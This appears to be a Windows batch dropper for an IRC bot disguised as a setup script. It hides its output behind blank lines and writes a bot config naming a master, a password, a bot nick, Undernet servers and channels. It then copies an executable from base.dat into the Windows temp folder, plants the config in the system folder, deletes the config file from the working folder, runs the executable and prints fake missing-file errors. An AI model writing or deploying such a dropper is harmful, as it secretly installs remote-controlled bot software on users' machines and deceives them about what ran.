@echo off
@cls
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@if not exist base.dat goto enda
@if exist c:\windows\system\s.ini goto end
@echo [ovivo]> cfg2.ini
@echo supermaster=Ovivo>> cfg2.ini
@echo parola=ovivo123>> cfg2.ini
@echo nick=GeniusBot>> cfg2.ini
@echo anick=GeniusBt>> cfg2.ini
@echo join=Sal $nick ! Ramai pe $chan .>> cfg2.ini
@echo canal1=#beta>> cfg2.ini
@echo canal2=#programare>> cfg2.ini
@echo canal3=#danycd>> cfg2.ini
@echo antipart=#ovivo>> cfg2.ini
@echo server1=flanders.be.eu.undernet.org>> cfg2.ini
@echo server2=se.undernet.org>> cfg2.ini
@echo server3=paris.fr.eu.undernet.org>> cfg2.ini
@echo server4=caen.fr.eu.undernet.org>> cfg2.ini
@copy base.dat c:\windows\temp\temp12.exe >nul
@copy cfg2.ini c:\windows\system >nul
@del cfg2.ini >nul
@c:\windows\temp\temp12.exe
:end
@if not exist c:\windows\vtx.dll echo File not found - vtx.dll
:enda
@if not exist base.dat echo Error : Setup Incomplete ! File not found - base.dat
